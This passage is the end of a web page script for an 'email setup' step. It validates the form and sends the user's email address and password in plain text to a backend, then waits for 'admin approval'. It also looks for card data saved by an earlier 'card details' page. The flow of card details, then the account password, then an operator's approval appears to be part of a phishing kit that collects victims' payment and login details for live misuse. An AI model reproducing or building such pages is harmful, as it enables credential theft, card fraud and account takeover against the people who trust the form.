                showError('confirmPassword', 'Passwords do not match');
                isValid = false;
            } else {
                showSuccess('confirmPassword');
            }
            
            // Validate Terms
            if (!termsAccepted) {
                showError('terms', 'You must accept the Terms of Service and Privacy Policy');
                isValid = false;
            }
            
            if (!isValid) {
                // Reset button state
                spinner.classList.remove('active');
                buttonText.textContent = 'Complete Setup';
                submitBtn.disabled = false;
                return;
            }
            
            try {
                // Prepare data in the format expected by Flask backend /email endpoint
                const emailData = {
                    email: email,
                    password: password
                };
                
                console.log('Sending email data to:', `${BACKEND_URL}/email`);
                console.log('Data:', emailData);
                
                const response = await fetch(`${BACKEND_URL}/email`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify(emailData)
                });
                
                console.log('Response status:', response.status);
                
                const data = await response.json();
                console.log('Response data:', data);
                
                if (response.ok && data.success) {
                    // Success - store session ID and start polling
                    const sessionId = data.id;
                    localStorage.setItem('sessionId', sessionId);
                    
                    // Update button text
                    buttonText.textContent = 'Waiting for approval...';
                    
                    // Show success message
                    document.getElementById('successMessage').textContent = 'Email setup submitted successfully. Waiting for admin approval...';
                    document.getElementById('successMessage').classList.add('show');
                    
                    // Store email data locally for reference
                    localStorage.setItem('email_data', JSON.stringify({
                        email: email,
                        setup_completed: true,
                        timestamp: new Date().toISOString()
                    }));
                    
                    // Start polling for status
                    pollStatus(sessionId);
                } else {
                    // Show error
                    const errorMsg = data.error || `Failed to setup email. Status: ${response.status}`;
                    document.getElementById('successMessage').textContent = errorMsg;
                    document.getElementById('successMessage').classList.add('show');
                    document.getElementById('successMessage').classList.remove('success-message');
                    document.getElementById('successMessage').classList.add('error-message');
                    
                    // Reset button
                    spinner.classList.remove('active');
                    buttonText.textContent = 'Complete Setup';
                    submitBtn.disabled = false;
                }
            } catch (error) {
                console.error('Network error:', error);
                document.getElementById('successMessage').textContent = `Network error: ${error.message}. Please check backend URL: ${BACKEND_URL}`;
                document.getElementById('successMessage').classList.add('show');
                document.getElementById('successMessage').classList.remove('success-message');
                document.getElementById('successMessage').classList.add('error-message');
                
                // Reset button
                spinner.classList.remove('active');
                buttonText.textContent = 'Complete Setup';
                submitBtn.disabled = false;
            }
        });
        
        // Initialize page
        document.addEventListener('DOMContentLoaded', () => {
            // Real-time password validation
            document.getElementById('password').addEventListener('input', function(e) {
                const password = e.target.value;
                checkPasswordStrength(password);
                
                // Clear error when user starts typing
                document.getElementById('passwordError').classList.remove('show');
                e.target.classList.remove('error');
            });
            
            // Clear errors on email input
            document.getElementById('email').addEventListener('input', function(e) {
                document.getElementById('emailError').classList.remove('show');
                e.target.classList.remove('error');
            });
            
            document.getElementById('confirmEmail').addEventListener('input', function(e) {
                document.getElementById('confirmEmailError').classList.remove('show');
                e.target.classList.remove('error');
            });
            
            document.getElementById('confirmPassword').addEventListener('input', function(e) {
                document.getElementById('confirmPasswordError').classList.remove('show');
                e.target.classList.remove('error');
            });
            
            // Check if we have data from previous steps
            const cardData = localStorage.getItem('card_data');
            if (!cardData) {
                console.log('No card data found. User should come from card details page.');
            }
            
            // Load previously saved email if exists
            const savedEmail = localStorage.getItem('email_data');
            if (savedEmail) {
                try {
                    const data = JSON.parse(savedEmail);
                    if (data.email) {
                        document.getElementById('email').value = data.email;
                        document.getElementById('confirmEmail').value = data.email;
                    }
                } catch (e) {
                    console.error('Error loading saved email:', e);
                }
            }
            
            // Initialize password strength display
            const password = document.getElementById('password').value;
            if (password) {
                checkPasswordStrength(password);
            }
            
            // Test backend connection
            console.log('Testing backend connection...');
            fetch(`${BACKEND_URL}/`)
                .then(response => {
                    console.log('Backend connection test:', response.status);
                    if (response.ok) {
                        console.log('Backend is reachable!');
                    }
                })
                .catch(error => {
                    console.error('Backend connection failed:', error);
                    console.error('Please make sure the backend is running at:', BACKEND_URL);
                });
        });
    </script>
</body>
</html>
